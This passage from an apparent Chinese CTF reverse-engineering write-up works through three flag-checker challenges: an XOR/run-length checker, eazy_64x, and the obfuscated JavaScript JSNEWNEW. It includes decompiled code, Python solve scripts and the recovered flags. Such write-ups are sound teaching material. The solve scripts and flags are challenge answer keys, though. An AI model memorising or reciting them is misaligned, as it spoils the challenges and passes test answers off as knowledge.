class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = key[v9 % <span class="number">4</span>] ^ v8;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v7--;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      s[v3] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v11++;</span><br><span class="line">    s[v5] = <span class="number">0</span>;</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">2559</span> )</span><br><span class="line">    s[v11++] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2559</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( r[i] != s[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Lose lose lose!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2560</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win win win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中数组r是在运行时生成的，因此需要使用动态调试</p><p>大概的逻辑是：</p><ul><li>接收输入直到回车符</li><li>计算每个字符异或的结果</li><li>异或的结果是多少，就在数组中添加多少个1，然后添加一个0</li><li>对比两个数组的差异</li></ul><p>因此解密的逻辑就是</p><ol><li>拿到目标数组</li><li>遍历数组中1的个数，直到遇到数字0</li><li>将以上1的个数循环异或key的元素</li><li>转换为字符输出</li><li>重复2到4，直到遇到-1</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = [...]</span><br><span class="line">ch = []</span><br><span class="line">key_index = <span class="number">0</span></span><br><span class="line">key = <span class="string">&#x27;SCNU&#x27;</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(hex(c), end=&#x27;&#x27;)</span></span><br><span class="line">        ch.append(<span class="built_in">chr</span>(c^<span class="built_in">ord</span>(key[key_index%<span class="number">4</span>])))</span><br><span class="line">        key_index += <span class="number">1</span></span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(ch))</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><h2 id="eazy-64x"><a href="#eazy-64x" class="headerlink" title="eazy_64x"></a>eazy_64x</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">  __isoc99_scanf(&amp;unk_222C, s);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 / <span class="number">3</span> &gt;= v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[v5], <span class="number">3u</span>LL);</span><br><span class="line">      v9 = encrypt(dest);</span><br><span class="line">      v8 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">      get_trans(v9);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9[i] != glob[<span class="number">4</span> * v4 + i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Oh,no!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">      ++v4;</span><br><span class="line">      v5 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6[v4] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; v4 - <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2] = v7[(<span class="keyword">unsigned</span> __int8)a1[v3] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v6[v2 + <span class="number">1</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * a1[v3]) &amp; <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    v6[v2 + <span class="number">2</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * a1[v3 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v6[v2 + <span class="number">3</span>] = v7[a1[v3 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v3 += <span class="number">3</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">get_trans</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] ^= <span class="number">0x68</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类似base编码之后还加了异或</p><p>思路：</p><ul><li>异或还原</li><li>base64</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x32</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0x1B</span>, <span class="number">0x10</span>, <span class="number">0x30</span>, <span class="number">0x5A</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x5A</span>, <span class="number">0x32</span>, <span class="number">0x3C</span>, <span class="number">0x21</span>, <span class="number">0x59</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x58</span>, <span class="number">0x55</span>]</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ss += <span class="built_in">chr</span>(i^<span class="number">0x68</span>)</span><br><span class="line">    </span><br><span class="line">print(base64.b64decode(ss))</span><br></pre></td></tr></table></figure><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h2 id="JSNEWNEW"><a href="#JSNEWNEW" class="headerlink" title="JSNEWNEW"></a>JSNEWNEW</h2><p>一个html内嵌经过混淆的js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="function"><span class="keyword">function</span> <span class="title">_Y0u</span>(<span class="params">_0x5093c8,_0x291ad5</span>)</span>&#123;<span class="keyword">return</span> _0x5093c8+_0x291ad5&#125;<span class="function"><span class="keyword">function</span> <span class="title">_C4n</span>(<span class="params">_0x4277b8</span>)</span>&#123;<span class="keyword">return</span> _0x4277b8&amp;<span class="number">0xff</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">_N3v3r</span>(<span class="params">_0x414184,_0x29df09</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x414184^_0x29df09)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G37</span>(<span class="params">_0x500f65,_0x1ddb85</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x500f65|_0x1ddb85)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_Th15</span>(<span class="params">_0x1621d6,_0x285fc7</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x1621d6&amp;_0x285fc7)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4</span>(<span class="params">_0x2abb65</span>)</span>&#123;<span class="keyword">return</span> _C4n(~_0x2abb65)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4</span>(<span class="params">_0x5b22bc</span>)</span>&#123;<span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],<span class="number">0x1</span>)))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1,_0x516603</span>)</span>&#123;<span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8,_0x11e8ab,_0x2c730f</span>)</span>&#123;<span class="keyword">return</span> a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>)</span>&#123;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">var</span> _0x8b9e29=<span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;passwordError&#x27;</span>);_0xcaf3caf3=[],_0xc4f3c4f3=[<span class="number">0x55</span>,<span class="number">0xbf</span>,<span class="number">0x63</span>,<span class="number">0xbc</span>,<span class="number">0x33</span>,<span class="number">0x95</span>,<span class="number">0x31</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x49</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xdf</span>,<span class="number">0x63</span>,<span class="number">0xe5</span>,<span class="number">0x57</span>,<span class="number">0xd7</span>,<span class="number">0x73</span>,<span class="number">0xa6</span>,<span class="number">0x6e</span>,<span class="number">0xd3</span>,<span class="number">0x63</span>,<span class="number">0xa1</span>,<span class="number">0x92</span>,<span class="number">0x5b</span>,<span class="number">0x72</span>,<span class="number">0xe6</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x4f</span>,<span class="number">0xd0</span>],Hur1k=<span class="string">&#x27;Hur1k&#x27;</span>;<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x27</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x6</span>)!=<span class="string">&#x27;XSCTF&#123;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="number">0x26</span>]!=<span class="string">&#x27;&#125;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];_0x114514=_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x6</span>,<span class="number">0x20</span>),_0x51eb06=[];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x114514[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;_0x51eb06[<span class="string">&#x27;push&#x27;</span>](_0x114514[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x28db6c))&#125;<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](),<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">_0x14b0c9,_0x56fb11</span>)</span>&#123;_0x56fb11=_0x56fb11||<span class="number">0x1</span>,_0x14b0c9=_0x14b0c9||<span class="number">0x0</span>,<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=(<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]*<span class="number">0x2455</span>+<span class="number">0xc091</span>)%<span class="number">0x38f40</span>;<span class="keyword">var</span> _0xee8b23=<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]/<span class="number">0x38f40</span>;<span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;<span class="keyword">var</span> _0xe5731c=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>);<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x51eb06[<span class="string">&#x27;length&#x27;</span>];_0x28db6c+=<span class="number">0x2</span></span>)</span>&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp),randNum=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>),<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+<span class="number">0x1</span>],Hur1k[<span class="string">&#x27;charCodeAt&#x27;</span>]([_0x28db6c/<span class="number">0x2</span>%Hur1k[<span class="string">&#x27;length&#x27;</span>]]),randNum),_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp)&#125;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">if</span>(_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x20</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;究极错误的&#x27;</span>,![];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;<span class="keyword">if</span>(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![]&#125;<span class="keyword">return</span>!![]&#125;</span><br></pre></td></tr></table></figure><p>首先经过<a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a>，初步解混淆<br>再通过<a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a>，再解一次<br>然后就解不动了（不排除有其他工具）</p><p>解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 